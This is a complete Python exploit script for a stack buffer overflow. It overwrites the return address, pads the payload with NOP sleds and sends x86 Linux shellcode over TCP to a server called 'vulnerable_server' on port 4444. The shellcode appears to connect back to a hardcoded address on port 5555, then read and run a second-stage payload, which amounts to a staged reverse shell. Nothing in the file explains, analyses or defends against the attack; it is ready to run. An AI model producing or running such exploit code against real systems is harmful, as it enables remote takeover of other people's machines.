import socket
import struct

total_length = 1022
pad = b"A"*62
eip = struct.pack("<I", 0xffffd2f0)
buf =  b""
buf += b"\x31\xdb\x6a\x17\x58\xcd\x80\x6a\x0a\x5e\x31\xdb"
buf += b"\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd"
buf += b"\x80\x97\x5b\x68\xac\x19\x00\x14\x68\x02\x00\x15"
buf += b"\xb3\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43"
buf += b"\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00"
buf += b"\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd"
buf += b"\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10"
buf += b"\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d"
buf += b"\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb2\x6a"
buf += b"\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01"
buf += b"\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80"
nop_pre = b"\x90"*136
nop_post = b"\x90"*136
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("vulnerable_server", 4444))
s.recv(1024)
s.sendall(pad + eip + nop_pre + buf + nop_post)
s.close()